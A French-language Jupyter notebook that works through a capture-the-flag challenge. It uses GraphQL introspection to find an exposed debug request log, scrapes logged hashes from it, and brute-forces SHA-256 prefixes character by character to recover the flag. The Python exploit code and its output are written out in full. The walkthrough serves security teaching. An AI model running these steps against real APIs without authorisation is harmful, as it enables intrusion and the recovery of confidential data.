{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Confessions"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Première analyse\n",
    "\n",
    "On démare avec un lien *confessions.geographer.fr*,   \n",
    "deux inputs, un bouton ...   \n",
    "On lance l'inspecteur du navigateur, et on test le formulaire tout en analysant les requêtes sur le réseaux.\n",
    "\n",
    "Plusieurs requêtes pointe vers **http://confessions.geographer.fr/graphql**,   \n",
    "donc on a affaire à une api GraphQL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GraphQL\n",
    "\n",
    "### Introspection\n",
    "\n",
    "Une des fonctionnalitées du GraphQL, c'est que l'on peut récupérer le schéma de l'api avec quelque requêtes.   \n",
    "\n",
    "\n",
    "```\n",
    "{\n",
    "  __schema {\n",
    "    queryType {\n",
    "      fields {\n",
    "        name\n",
    "        description\n",
    "      }\n",
    "    }\n",
    "  }\n",
    "}\n",
    "```\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "import hashlib\n",
    "import time\n",
    "\n",
    "URL = \"https://confessions.geographer.fr/graphql\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'data': {'__schema': {'queryType': {'fields': [{'name': 'requestsLog', 'description': 'Show the resolver access log. TODO: remove before production release'}, {'name': 'confession', 'description': 'Get a confession by its hash. Does not contain confidential data.'}]}}}}\n"
     ]
    }
   ],
   "source": [
    "payload=\"{\\\"query\\\":\\\"{\\\\n  __schema {\\\\n    queryType {\\\\n      fields {\\\\n        name\\\\n        description\\\\n      }\\\\n    }\\\\n  }\\\\n}\\\",\\\"variables\\\":{}}\"\n",
    "headers = {\n",
    "  'Content-Type': 'application/json',\n",
    "}\n",
    "\n",
    "response = requests.request(\"POST\", URL, headers=headers, data=payload)\n",
    "\n",
    "print(json.loads(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "On remarque un champs *requestsLog* avec la mention *remove before production release*... donc on va l'exploiter.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Les logs\n",
    "\n",
    "On récupère les logs...\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload=\"{\\\"query\\\":\\\"query RequestsLog {\\\\n  requestsLog {\\\\n    timestamp\\\\n    name\\\\n    args\\\\n  }\\\\n}\\\",\\\"variables\\\":{}}\"\n",
    "headers = {\n",
    "  'Content-Type': 'application/json',\n",
    "}\n",
    "\n",
    "logsList = requests.request(\"POST\", URL, headers=headers, data=payload).text\n",
    "\n",
    "print(json.loads(logsList))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Il y a une grande quantité de logs, mais on peut quand même faire un premier tri.\n",
    "\n",
    "Les logs contiennent un champs *timestamp*, *name* et *args*.   \n",
    "Dans ce dernier champs on trouve soit *title*, *message*, soit *hash*.\n",
    "\n",
    "On va donc utiliser les hashs que l'on recupère avec la requête *confession* pour obternir des infos."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"data\":{\"confession\":{\"title\":\"flag\",\"hash\":\"df7e70e5021544f4834bbee64a9e3789febc4be81470df629cad6ddb03320a5c\"}}}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "payload=\"{\\\"query\\\":\\\"query ExampleQuery {\\\\n  confession(hash: \\\\\\\"df7e70e5021544f4834bbee64a9e3789febc4be81470df629cad6ddb03320a5c\\\\\\\") {\\\\n    title\\\\n    hash\\\\n  }\\\\n}\\\",\\\"variables\\\":{}}\"\n",
    "headers = {\n",
    "  'Content-Type': 'application/json',\n",
    "}\n",
    "\n",
    "sampleConfession = requests.request(\"POST\", URL, headers=headers, data=payload).text\n",
    "\n",
    "print(sampleConfession)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On va retrouver plein de titre differents, mais un saute au yeux.\n",
    "\n",
    "Certain des titres contiennent le mot *flag*, on suppose que ça peut aider pour la suite."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Le site\n",
    "\n",
    "Bon, pour l'instant on à ce qui pourrai être le flag mais on en à plusieur et tout est hashé.\n",
    "\n",
    "On va refaire un tour sur le site pour comment son fait les requêtes."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "En analysant les requêtes reseaux et en utilisant le site, on peut s'appercevoir qu'à chaque charactère ajouté au input, une requête était envoyé.\n",
    "\n",
    "Ça expliquerai donc pourquoi on à autant de confession avec le *title* **flag**\n",
    "\n",
    "Le fait qu'à chaque charactère ajouté, soit créé un hash implique une chose,   \n",
    "le flag hashé est accéssible charactère par charactère..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Un peu de math\n",
    "\n",
    "Admetons que nous devions trouver un mot de passe entier de 6 charactère alphanumeric (donc 62 possibilitées)\n",
    "\n",
    "La probabilité de trouver ce mot de passe sera de:\n",
    "\n",
    "62 * 62 * 62 * 62 * 62 * 62 soit 56'800'235'584     \n",
    "ça fait beaucoup\n",
    "\n",
    "Maintenant, admetons que l'on à accès à chaque étapes du mot de passe, il suffirai de trouver le premier hash donc un seul charactère, puis le second et ainsi de suite.\n",
    "\n",
    "La probabilité de trouver le mot de passe serai désormais de:\n",
    "\n",
    "62 + 62 + 62 + 62 + 62 + 62 soit 372     \n",
    "autrement dit quasiment instantanement pour un pc lambda"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Brute force\n",
    "\n",
    "Avec toute ces infos, il nous retse plus qu'à:\n",
    "- isoler les confessions avec le title *flag* (ou equivalent)\n",
    "- récupérer les hashes\n",
    "- brute force les hashes un par un tout en ajoutant le resultat du hash précedant au début du nouveau brutforce."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Parsing logs...\n",
      "\n"
     ]
    }
   ],
   "source": [
    "targeted_hashes = []\n",
    "# filtered_hashes = []\n",
    "\n",
    "print(\"\\nParsing logs...\\n\")\n",
    "\n",
    "for log in json.loads(logsList)[\"data\"][\"requestsLog\"]:\n",
    "    if log.get(\"args\") and \"hash\" in log.get(\"args\"):\n",
    "        targeted_hashes.append(log.get(\"args\")[9:-2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FLAG -> BFS{plz_d0nt_t3ll_any1}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "printable_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}'\n",
    "FLAG = \"\"\n",
    "\n",
    "def unHash(target):\n",
    "    global FLAG\n",
    "    for char in printable_chars:\n",
    "        testing_hash = hashlib.sha256((FLAG + char).encode('utf-8')).hexdigest()\n",
    "        if testing_hash == target:\n",
    "            print(\"\\rFLAG -> \" + FLAG + char, end=\"\")\n",
    "            FLAG = FLAG + char\n",
    "            time.sleep(0.1) # Ralentir l'affichage (pour un effect plus cool)\n",
    "            break\n",
    "\n",
    "for hash in targeted_hashes:\n",
    "    unHash(hash)\n",
    "\n",
    "print(\"\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Le Flag\n",
    "\n",
    "Et voilà ! le flag est donc **BFS{plz_d0nt_t3ll_any1}**"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.7 ('venv': venv)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bc27008efa1319e4f2b9d5c3a2e3412146666498bed4db44dd224b7bd205749"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
